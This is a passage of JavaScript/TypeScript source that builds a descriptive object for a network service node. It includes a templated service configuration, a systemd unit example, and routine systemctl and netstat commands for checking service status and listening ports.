                 tech.toLowerCase().includes('python') ? 'python' :
                 tech.toLowerCase().includes('java') ? 'java' :
                 tech.toLowerCase().includes('go') ? 'go' : 'typescript',
    codeFileName: `${systemId.toLowerCase().replace(/\s+/g, '_')}_service.conf`,
    codeExplanation: `${app} running on ${os} at ${ip}:${port}. Implements secure network communications, service monitoring, and operational state logging.`,
    exampleCode: `# Production configuration for ${systemId} (${app})
# Hostname: ${hostname} | IP: ${ip} | Port: ${port} | OS: ${os}
service_name: "${systemId.toLowerCase().replace(/\s+/g, '-')}"
application: "${app}"
technology: "${tech}"
listen_address: "${ip}:${port}"
status: "${nodeProps?.status || 'HEALTHY'}"
tls_enabled: true
health_check_endpoint: "/healthz"
metrics_port: 9100`,
    tools: [
      {
        name: 'systemctl',
        version: 'v255',
        description: 'Systemd service manager controlling daemon state and lifecycle.',
        installationCommand: 'Included in OS distribution',
        configLanguage: 'ini',
        configExample: `[Unit]\nDescription=${app}\nAfter=network.target\n\n[Service]\nExecStart=/usr/bin/${systemId.toLowerCase().replace(/\s+/g, '-')}\nRestart=always\n\n[Install]\nWantedBy=multi-user.target`,
        usageLanguage: 'bash',
        exampleUsage: `sudo systemctl status ${systemId.toLowerCase().replace(/\s+/g, '-')}.service`
      },
      {
        name: 'netstat',
        version: 'v2.10',
        description: 'Network utility monitoring socket connections and port listening states.',
        installationCommand: 'sudo apt-get install -y net-tools',
        configLanguage: 'bash',
        configExample: `netstat -tlpn | grep :${port}`,
        usageLanguage: 'bash',
        exampleUsage: `netstat -anp | grep :${port}`
      }
    ]
  };
}

